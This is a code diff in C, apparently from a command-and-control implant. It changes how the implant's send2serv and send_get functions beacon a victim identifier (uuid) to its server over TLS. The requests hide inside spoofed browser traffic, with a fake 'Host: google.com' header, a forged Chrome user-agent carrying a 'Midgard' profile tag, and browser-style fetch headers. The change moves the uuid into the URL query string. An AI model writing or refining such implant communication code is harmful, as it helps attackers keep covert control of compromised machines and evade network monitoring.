@@ -16,7 +16,7 @@
 #include "mbedtls/x509_crt.h"
 
 
-#define QUEUE_DEPTH 3
+#define QUEUE_DEPTH 10
 #define PROFILE "Midgard"
 
 
@@ -43,7 +43,7 @@ int send2serv(request_t *req, const char *uuid, const unsigned char *buf, size_t
     connection(req);
     char header_buffer[1024];
     int header_len = snprintf(header_buffer, sizeof(header_buffer),
-        "POST /login? HTTP/1.1\r\n"
+        "POST /login?uuid=%s HTTP/1.1\r\n"
         "Host: google.com\r\n"
         "Accept-Language: en-US,en;q=0.\r\n"
         "Upgrade-Insecure-Requests: 1\r\n"
@@ -51,7 +51,6 @@ int send2serv(request_t *req, const char *uuid, const unsigned char *buf, size_t
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
         "Content-Length: %lu\r\n"
         "Sec-Ch-Ua-Mobile: ?0\r\n"
-        "X-Client-Data: %s\r\n"
         "Sec-Fetch-Site: none\r\n"
         "Sec-Fetch-Mode: navigate\r\n"
         "Sec-Fetch-User: ?1\r\n"
@@ -59,7 +58,7 @@ int send2serv(request_t *req, const char *uuid, const unsigned char *buf, size_t
         "Accept-Encoding: gzip, deflate, br\r\n"
         "Priority: u=0, i\r\n"
         "Connection: keep-alive\r\n\r\n",
-        len, uuid);
+        uuid, len);
 
 
     size_t total_len = header_len + len;
@@ -94,14 +93,13 @@ char *send_get(request_t *req, const char *uuid, char *path, char *hostname) {
 
     char request_buffer[2048];
     int req_len = snprintf(request_buffer, sizeof(request_buffer),
-        "GET /%s HTTP/1.1\r\n"
+        "GET /%s?uuid=%s HTTP/1.1\r\n"
         "Host: google.com\r\n"
         "Accept-Language: en-US,en;q=0.\r\n"
         "Upgrade-Insecure-Requests: 1\r\n"
         "User-Agent: %s/381.3 /%s/918.4 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
         "Sec-Ch-Ua-Mobile: ?0\r\n"
-        "X-Client-Data: %s\r\n"
         "Sec-Fetch-Site: none\r\n"
         "Sec-Fetch-Mode: navigate\r\n"
         "Sec-Fetch-User: ?1\r\n"
@@ -109,7 +107,7 @@ char *send_get(request_t *req, const char *uuid, char *path, char *hostname) {
         "Accept-Encoding: gzip, deflate, br\r\n"
         "Priority: u=0, i\r\n"
         "Connection: keep-alive\r\n\r\n",
-        path, PROFILE, hostname, uuid);
+        path, uuid, PROFILE, hostname);
 
     int ret;
     while ((ret = mbedtls_ssl_write(&req->ssl, (const unsigned char *)request_buffer, req_len)) <= 0) {
